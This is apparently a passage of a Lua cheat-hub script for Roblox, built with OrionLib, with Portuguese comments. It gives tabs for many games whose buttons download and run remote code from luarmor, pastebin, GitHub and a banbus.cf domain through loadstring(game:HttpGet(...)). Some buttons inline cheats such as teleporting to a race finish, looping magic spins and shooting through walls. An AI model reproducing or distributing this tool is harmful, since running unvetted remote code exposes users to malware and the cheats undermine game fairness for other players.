    Callback = function()
        -- Executa o script do 
        loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/4f5c7bbe546251d81e9d3554b109008f.lua"))()

    end    
})

-- Criando a aba 
local GraceTab = Window:MakeTab({
    Name = "Grace",
    Icon = "rbxassetid://108776114629126",  -- Você pode usar um ícone de sua escolha
    PremiumOnly = false
})

-- Criando a seção dentro da aba 
GraceTab:AddSection({
    Name = "Grace"
})

-- Adicionando o botão para executar o script
GraceTab:AddButton({
    Name = "Aussie WIRE",
    Callback = function()
        -- Executa o script do 
        loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/4f5c7bbe546251d81e9d3554b109008f.lua"))()

    end    
})


-- Criando a aba 
local LiftingSimulatorTab = Window:MakeTab({
    Name = "Lifting Simulator",
    Icon = "rbxassetid://108776114629126",  -- Você pode usar um ícone de sua escolha
    PremiumOnly = false
})

-- Criando a seção dentro da aba 
LiftingSimulatorTab:AddSection({
    Name = "Lifting Simulator"
})

-- Adicionando o botão para executar o script
LiftingSimulatorTab:AddButton({
    Name = "Execute",
    Callback = function()
        -- Executa o script do 
        loadstring(game:HttpGet(('https://pastebin.com/raw/zQ9zFW0f'),true))()
        -- Notificação de sucesso após a execução

    end    
})

-- Criando a aba para A Sols Rng
local GrassCuttingSimulatorTab = Window:MakeTab({
    Name = "Grass Cutting Simulator",
    Icon = "rbxassetid://108776114629126",  -- Ícone da aba (você pode mudar se quiser)
    PremiumOnly = false
})

-- Criando uma seção dentro da aba
local GrassCuttingSimulatorTab = GrassCuttingSimulatorTab:AddSection({
    Name = "Grass Cutting Simulator"
})

-- Botão para executar o script Slap Battles
GrassCuttingSimulatorTab:AddButton({
    Name = "Grass Cutting Simulator",  -- Nome do botão
    Callback = function()
        -- Executando o script do link fornecido
        loadstring(game:HttpGet('https://raw.githubusercontent.com/AtroxEGO/grass-cutting-simulator/main/grass-cutting-script-AtroxEGO.lua'))()
        -- Notificação de sucessoa

    end    
})

-- Criando a aba 
local EvadeTab = Window:MakeTab({
    Name = "Evade",
    Icon = "rbxassetid://108776114629126",  -- Você pode usar um ícone de sua escolha
    PremiumOnly = false
})

-- Criando a seção dentro da aba 
EvadeTab:AddSection({
    Name = "Evade"
})

-- Adicionando o botão para executar o script
EvadeTab:AddButton({
    Name = "Aussie WIRE",
    Callback = function()
        -- Executa o script do 
        loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/4f5c7bbe546251d81e9d3554b109008f.lua"))()
        -- Notificação de sucesso após a execução

    end    
})

-- Criando a aba 
local SuperLeagueSoccerTab = Window:MakeTab({
    Name = "Super League Soccer",
    Icon = "rbxassetid://108776114629126",  -- Você pode usar um ícone de sua escolha
    PremiumOnly = false
})

-- Criando a seção dentro da aba 
SuperLeagueSoccerTab:AddSection({
    Name = "Super League Soccer"
})

-- Adicionando o botão para executar o script
SuperLeagueSoccerTab:AddButton({
    Name = "Flare Hub",
    Callback = function()
        -- Executa o script do 
        loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/1d6e39be6b826994a45f4d45d7b40f83.lua"))()
        -- Notificação de sucesso após a execução

    end    
})

-- Adicionando o botão para executar o script
SuperLeagueSoccerTab:AddButton({
    Name = "CN HUB",
    Callback = function()
        -- Executa o script do 
        loadstring(game:HttpGet("https://raw.githubusercontent.com/RobloxHackingProject/CHHub/main/CHHub.lua"))()
        -- Notificação de sucesso após a execução

    end    
})

-- Criando a aba para A Sols Rng
local DeadlySinsRetributionTab = Window:MakeTab({
    Name = "Deadly Sins Retribution",
    Icon = "rbxassetid://108776114629126",  -- Ícone da aba (você pode mudar se quiser)
    PremiumOnly = false
})

-- Criando uma seção dentro da aba
local DeadlySinsRetributionTab = DeadlySinsRetributionTab:AddSection({
    Name = "Deadly Sins Retribution"
})

-- Botão para executar o script Slap Battles
DeadlySinsRetributionTab:AddButton({
    Name = "Deadly Sins Retribution",  -- Nome do botão
    Callback = function()
        -- Executando o script do link fornecido
        _G.AutoMagic = true
while _G.AutoMagic do wait()

game:GetService("Players").LocalPlayer.PlayerGui.MainUI.LocalScript.Magic1Spin:FireServer(game:GetService("Players").LocalPlayer.PlayerGui.MainUI.Contents.RaceMagic)
wait(0.1)

if game.Players.LocalPlayer.Character.Data.Magic.Value == "Sunshine" or "Infinity" or "Babylon" then
_G.AutoMagic = false
  end
end
        -- Notificação de sucessoa

    end    
})


-- Criando a aba para A Sols Rng
local RaiseAFloppa2Tab = Window:MakeTab({
    Name = "Raise a Floppa 2",
    Icon = "rbxassetid://108776114629126",  -- Ícone da aba (você pode mudar se quiser)
    PremiumOnly = false
})

-- Criando uma seção dentro da aba
local RaiseAFloppa2Tab = RaiseAFloppa2Tab:AddSection({
    Name = "Raise a Floppa 2"
})

-- Botão para executar o script Slap Battles
RaiseAFloppa2Tab:AddButton({
    Name = "Floppa 2",  -- Nome do botão
    Callback = function()
        -- Executando o script do link fornecido
        loadstring(game:HttpGet('https://raw.githubusercontent.com/zReal-King/Raise-A-Floppa-2/main/Gui'))()
        -- Notificação de sucessoa

    end    
})

-- Criando a aba para A Sols Rng
local RaiseAFloppa2Tab = Window:MakeTab({
    Name = "Raise a Floppa 2",
    Icon = "rbxassetid://108776114629126",  -- Ícone da aba (você pode mudar se quiser)
    PremiumOnly = false
})

-- Criando uma seção dentro da aba
local RaiseAFloppa2Tab = RaiseAFloppa2Tab:AddSection({
    Name = "Raise a Floppa 2"
})

-- Botão para executar o script Slap Battles
RaiseAFloppa2Tab:AddButton({
    Name = "Floppa 2",  -- Nome do botão
    Callback = function()
        -- Executando o script do link fornecido
        loadstring(game:HttpGet('https://raw.githubusercontent.com/zReal-King/Raise-A-Floppa-2/main/Gui'))()
        -- Notificação de sucessoa

    end    
})

-- Criando a aba para A Sols Rng
local EnergrAssaultTab = Window:MakeTab({
    Name = "Energy Assault",
    Icon = "rbxassetid://108776114629126",  -- Ícone da aba (você pode mudar se quiser)
    PremiumOnly = false
})

-- Criando uma seção dentro da aba
local EnergrAssaultTab = EnergrAssaultTab:AddSection({
    Name = "Energy Assault"
})

-- Botão para executar o script Slap Battles
EnergrAssaultTab:AddButton({
    Name = "WallBang",  -- Nome do botão
    Callback = function()
        -- Executando o script do link fornecido
        workspace.map.otherparts.Parent = workspace.map.bulletsgothrough
        -- Notificação de sucessoa

    end    
})

-- Criando a aba para A Sols Rng
local AdoptMeTab = Window:MakeTab({
    Name = "Adopt Me",
    Icon = "rbxassetid://108776114629126",  -- Ícone da aba (você pode mudar se quiser)
    PremiumOnly = false
})

-- Criando uma seção dentro da aba
local AdoptMeTab = AdoptMeTab:AddSection({
    Name = "Adopt Me"
})

-- Botão para executar o script Slap Battles
AdoptMeTab:AddButton({
    Name = "QHub",  -- Nome do botão
    Callback = function()
        -- Executando o script do link fornecido
        loadstring(game:HttpGet(("https://pastebin.com/raw/FuUNK9Lf"), true))()
        -- Notificação de sucessoa

    end    
})

-- Criando a aba para A Sols Rng
local ShockwaveRacingTab = Window:MakeTab({
    Name = "Shockwave Racing",
    Icon = "rbxassetid://108776114629126",  -- Ícone da aba (você pode mudar se quiser)
    PremiumOnly = false
})

-- Criando uma seção dentro da aba
local ShockwaveRacingTab = ShockwaveRacingTab:AddSection({
    Name = "Shockwave Racing"
})

-- Botão para executar o script Slap Battles
ShockwaveRacingTab:AddButton({
    Name = "QHub",  -- Nome do botão
    Callback = function()
        -- Executando o script do link fornecido
        while wait(0.1) do
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = workspace.Finish.Finish.CFrame
            end
        -- Notificação de sucessoa

    end    
})

-- Criando a aba para A Sols Rng
local ShindoLifeTab = Window:MakeTab({
    Name = "Shindo Life",
    Icon = "rbxassetid://108776114629126",  -- Ícone da aba (você pode mudar se quiser)
    PremiumOnly = false
})

-- Criando uma seção dentro da aba
local ShindoLifeTab = ShindoLifeTab:AddSection({
    Name = "Shindo Life"
})

-- Botão para executar o script Slap Battles
ShindoLifeTab:AddButton({
    Name = "Project Nexus",  -- Nome do botão
    Callback = function()
        -- Executando o script do link fornecido
        loadstring(game:HttpGet("https://raw.githubusercontent.com/IkkyyDF/ProjectNexus/main/Loader.lua"))()
        -- Notificação de sucessoa

    end    
})

-- Criando a aba 
local ADustyTripTab = Window:MakeTab({
    Name = "A Dusty Trip",
    Icon = "rbxassetid://108776114629126",  -- Você pode usar um ícone de sua escolha
    PremiumOnly = false
})

-- Criando a seção dentro da aba 
ADustyTripTab:AddSection({
    Name = "A Dusty Trip"
})

-- Adicionando o botão para executar o script
ADustyTripTab:AddButton({
    Name = "Connect Hub",
    Callback = function()
        -- Executa o script do 
        loadstring(game:HttpGet('https://raw.githubusercontent.com/artemy133563/Utilities/main/ADustyTrip',true))()
        -- Notificação de sucesso após a execução

    end    
})

-- Adicionando o botão para executar o script
ADustyTripTab:AddButton({
    Name = "Execute",
    Callback = function()
        -- Executa o script do 
        loadstring(game:HttpGet("https://raw.githubusercontent.com/artemy133563/Utilities/main/ADustyTrip",true))()
        -- Notificação de sucesso após a execução

    end    
})

-- Criando a aba para A Sols Rng
local TowerDefenseSimulatorTab = Window:MakeTab({
    Name = "Tower Defense Simulator",
    Icon = "rbxassetid://108776114629126",  -- Ícone da aba (você pode mudar se quiser)
    PremiumOnly = false
})

-- Criando uma seção dentro da aba
local TowerDefenseSimulatorTab = TowerDefenseSimulatorTab:AddSection({
    Name = "Tower Defense Simulator"
})

-- Botão para executar o script Slap Battles
TowerDefenseSimulatorTab:AddButton({
    Name = "Tower Defense Simulator",  -- Nome do botão
    Callback = function()
        -- Executando o script do link fornecido
        loadstring(game:HttpGet("https://banbus.cf/scripts/autofarmconfig"))()
        -- Notificação de sucessoa

    end    
})


-- Criando a aba para o Universal Admin
local universalAdminTab = Window:MakeTab({
    Name = "Universal Admin",
    Icon = "rbxassetid://85398723149532", -- Ícone da aba (pode trocar se quiser)
    PremiumOnly = false
})

-- Adicionando uma seção para o script do Universal Admin
local universalAdminSection = universalAdminTab:AddSection({
    Name = "Universal Admin"
})

-- Adicionando o botão para executar o script do Universal Admin
universalAdminSection:AddButton({
    Name = "Executar Universal Admin",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/GamerScripter/Game-Hub/main/loader"))()
        OrionLib:MakeNotification({
            Name = "Universal Admin",
            Content = "O script foi executado com sucesso!",
            Image = "rbxassetid://4483345998", -- Ícone da notificação (pode trocar se quiser)
            Time = 5
        })
    end    
})

-- Finalizando a configuração do OrionLib
OrionLib:Init()# coidesUniversalHub
